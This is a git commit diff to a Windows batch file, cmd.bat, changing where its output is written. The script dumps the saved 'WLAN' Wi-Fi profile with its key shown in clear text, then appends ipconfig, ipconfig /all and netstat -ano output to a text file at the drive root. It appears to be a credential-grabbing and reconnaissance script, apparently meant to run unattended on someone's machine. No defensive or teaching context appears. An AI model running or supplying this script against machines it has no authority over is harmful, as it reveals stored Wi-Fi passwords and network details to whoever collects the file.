ad26978d18c01d0e9c3d624288eaf5f7aaaf2bc8
chukfinley <77645077+chukfinley@users.noreply.github.com>
2021-09-18 21:01:46 +0200

    Update cmd.bat

--- cmd.bat
+++ cmd.bat
@@ -1,4 +1,4 @@
-netsh wlan show profile "WLAN" key=clear > C:\1bla.txt
+netsh wlan show profile "WLAN" key=clear > \1bla.txt
 ipconfig >> \1bla.txt
 ipconfig /all >> \1bla.txt
 netstat -ano >> \1bla.txt
